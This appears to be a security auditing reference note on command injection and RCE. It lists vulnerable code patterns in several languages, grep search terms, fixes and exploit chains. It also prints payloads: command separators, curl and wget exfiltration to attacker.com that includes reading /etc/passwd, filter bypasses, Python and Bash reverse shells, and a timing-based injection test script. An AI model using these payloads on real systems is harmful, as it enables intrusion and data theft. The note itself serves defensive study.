# Command Injection & RCE

**Tags:** #critical #rce #command-injection #exec #injection
**OWASP:** A03:2021 Injection
**CVSS Base:** 10.0 (Maximum Critical → unauthenticated RCE)

---

## 📖 What is it

Command Injection occurs when user input is passed directly to operating system execution functions without sanitization.  
RCE (Remote Code Execution) is the result: the attacker executes arbitrary commands on the server.

---

## 🎯 Vulnerable Code Patterns

### PHP
```php
//  VULNERABLE
$output = shell_exec("ping " . $_GET['host']);
$result = system("ls " . $_POST['dir']);
$out = exec("convert " . $filename);
passthru("nmap " . $ip);
```

### Python
```python
#  VULNERABLE — os.system passes to shell
import os
os.system("ping " + user_input)

#  VULNERABLE — shell=True is the attack vector
import subprocess
subprocess.run("ls " + path, shell=True)

#  VULNERABLE — eval() with external input
eval(user_code)
```

### Node.js
```javascript
//  VULNERABLE
const { exec } = require('child_process');
exec('ls ' + req.query.dir, callback);

//  VULNERABLE — eval with input
eval(req.body.code);
```

### Java
```java
//  VULNERABLE
Runtime.getRuntime().exec("ping " + host);
Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
```

---

## 🔍 `grep_search` Tactics

```
exec(
system(
shell_exec(
passthru(
popen(
os.system(
subprocess.run(
subprocess.call(
subprocess.Popen(
child_process.exec(
eval(
Runtime.getRuntime()
ProcessBuilder
```

**Critical heuristic:** search for `shell=True` in Python — it is the flag that enables shell interpretation, required for Command Injection.

---

## 💣 Confirmation Payloads

### Command Separators
```bash
# Linux
; id
| id
|| id
& id
&& id
`id`
$(id)

# Windows
& whoami
| whoami
&& whoami
```

### Exfiltration Payloads (OOB)
```bash
; curl http://attacker.com/?data=$(id)
; wget http://attacker.com/?o=$(cat /etc/passwd)
```

### Simple Filter Bypasses
```bash
# Bypass with tabs and alternative spaces
;{id}
;$IFS$9id
# Blacklist bypass with quotes
;i""d
# IP whitelist bypass
127.0.0.1;id
localhost|id
```

### Reverse Shell (after RCE confirmation)
```bash
# Python reverse shell
;python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Bash
;bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

---

## 🧪 Ephemeral Validation Script (`.tmp/`)

```python
# .tmp/validate_cmdi.py — DISCARD AFTER USE
import requests
import sys

TARGET = "http://target.com/api/ping"
PAYLOADS = [
    "; sleep 5",
    "| sleep 5",
    "&& sleep 5",
    "`sleep 5`",
    "$(sleep 5)"
]

for payload in PAYLOADS:
    import time
    start = time.time()
    try:
        r = requests.post(TARGET, data={"host": f"127.0.0.1{payload}"}, timeout=10)
        elapsed = time.time() - start
        if elapsed >= 4.5:
            print(f"[VULN] Time-based confirmed: {payload} (elapsed: {elapsed:.1f}s)")
        else:
            print(f"[safe] {payload} (elapsed: {elapsed:.1f}s)")
    except Exception as e:
        print(f"[ERROR] {e}")
```

---

## 🛡️ Fix

```python
#  CORRECT — argument list, no shell=True
import subprocess
result = subprocess.run(["ping", "-c", "4", host], capture_output=True, text=True)

#  CORRECT — explicit whitelist
ALLOWED_HOSTS = ["8.8.8.8", "1.1.1.1"]
if host not in ALLOWED_HOSTS:
    raise ValueError("Host not allowed")
```

```php
//  CORRECT — escapeshellarg()
$safe_host = escapeshellarg($_GET['host']);
$output = shell_exec("ping -c 4 " . $safe_host);
```

**Golden rule:** never use `shell=True` (Python) or build command strings with external input. Always use argument lists.

---

## 🔗 Chain Exploits

```
RCE → Reverse Shell → Full server access
RCE + Container without restricted USER → container escape via /proc/1/root
RCE + /etc/passwd readable → user enumeration for pivoting
Command injection in backup script → invisible scheduled RCE
```

---

## 📌 References
- [[eip-exploratory-investigation-protocol]]
- [[iac-security-docker-kubernetes-terraform]]
- [[severity-matrix]]